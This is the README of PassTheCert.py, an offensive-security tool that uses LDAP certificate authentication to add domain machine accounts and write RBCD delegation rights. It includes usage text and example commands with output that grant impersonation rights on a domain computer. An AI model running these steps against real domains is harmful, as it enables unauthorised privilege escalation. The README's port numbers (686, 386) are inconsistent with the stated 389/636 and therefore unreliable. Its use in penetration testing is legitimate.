PassTheCert.py
==============

This POC implements LDAP certificate authentication for two impacket scripts:
[addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)
and [rbcd.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py).
You can perform LDAP certificate authentication both on port 686 and 389 (via a
StarTLS command). Please note that you need a functional LDAPS service on the
targeted domain controller to successfully use StartTLS on the LDAP port.

More information in the [accompanying blog post](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).

If you use [Certipy](https://github.com/ly4k/Certipy) to retrieve certificates, you can extract key and cert from the pfx by using:

```console
$ certipy cert -pfx user.pfx -nokey -out user.crt
$ certipy cert -pfx user.pfx -nocert -out user.key
```

Usage
-----

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: passthecert.py [-h] [-debug] [-port {389,636}] [-action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd}]] [-baseDN DC=test,DC=local]
                      [-computer-group CN=Computers] [-domain test.local] [-domain-netbios NETBIOSNAME] [-computer-name COMPUTER-NAME$] [-computer-pass password] [-delegate-to DELEGATE_TO]
                      [-delegate-from DELEGATE_FROM] [-dc-host hostname] [-dc-ip ip] -crt user.crt -key user.key

Manage domain computers and perform RBCD attack via LDAP certificate authentication

optional arguments:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -port {389,636}       Destination port to connect to. LDAPS (via StartTLS) on 386 or LDAPS on 636.

Action:
  -action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd}]

Manage Computer:
  -baseDN DC=test,DC=local
                        Set baseDN for LDAP.If ommited, the domain part (FQDN) specified in the account parameter will be used.
  -computer-group CN=Computers
                        Group to which the account will be added. If omitted, CN=Computers will be used,
  -domain test.local    Target domain fqdn
  -domain-netbios NETBIOSNAME
                        Domain NetBIOS name. Required if the DC has multiple domains.
  -computer-name COMPUTER-NAME$
                        Name of computer to add.If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.
  -computer-pass password
                        Password to set to computerIf omitted, a random [A-Za-z0-9]{32} will be used.

RBCD attack:
  -delegate-to DELEGATE_TO
                        Target computer account the attacker has at least WriteProperty to
  -delegate-from DELEGATE_FROM
                        Attacker controlled machine account to write on the msDS-Allo[...] property (only when using `-action write`)

Authentication:
  -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
  -dc-ip ip             IP of the domain controller to use. Useful if you can't translate the FQDN.
  -crt user.crt         User's certificate
  -key user.key         User's private key
```

Actions
-------
* Manage Comuter
  * `add_computer`: Add a computer to the domain
  * `del_computer`: Delete a computer from the domain
  * `modify_computer`: Modify the password of the computer

* RBCD attack
  * `read_rbcd`: Read `msDS-AllowedToActOnBehalfOfOtherIdentity` and resolve SIDs to `sAMaccountnames`
  * `write_rbcd`: Write new SIDs to `the msDS-AllowedToActOnBehalfOfOtherIdentity`
  * `remove_rbcd`: Remove specific entries
  * `flush_rbcd`: Flush all entries

* Misc
  * `whoami`: Return the user represented by the certificate

Examples
--------

Create a computer via LDAPS:

```console
$ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Successfully added machine account DESKTOP-CKDRXFUX$ with password dzy3pjZqEH6f4Igql5dp4I5Dx8uA4PrV.
```

Create a computer via LDAPS with custom name/password:

```console
$ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -computer-name OFFSECMACHINE$ -computer-pass SheSellsSeaShellsOnTheSeaShore
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Successfully added machine account OFFSECMACHINE$ with password SheSellsSeaShellsOnTheSeaShore.
```

Add a delegation right via StartTLS on port 389:

```console
$ python3 passthecert.py -action write_rbcd -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -port 389 -delegate-to DESKTOP-CKDRXFUX$ -delegate-from SRV-MAIL$
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] SRV-MAIL$ can now impersonate users on DESKTOP-CKDRXFUX$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     SRV-MAIL$    (S-1-5-21-XXXXXXXXX-YYYYYYYYYY-WWWWWWWW-1109)
```

Credits
-------

- [JaGoTu (@jagotu)](https://twitter.com/jagotu) for [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)
- [Remi Gascou (@podalirius_)](https://twitter.com/podalirius_) and [Charlie Bromberg (@_nwodtuhs)](https://twitter.com/_nwodtuhs) for [rbcd.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py)
* [Impacket](https://github.com/SecureAuthCorp/impacket) by [SecureAuth](https://www.secureauth.com/)

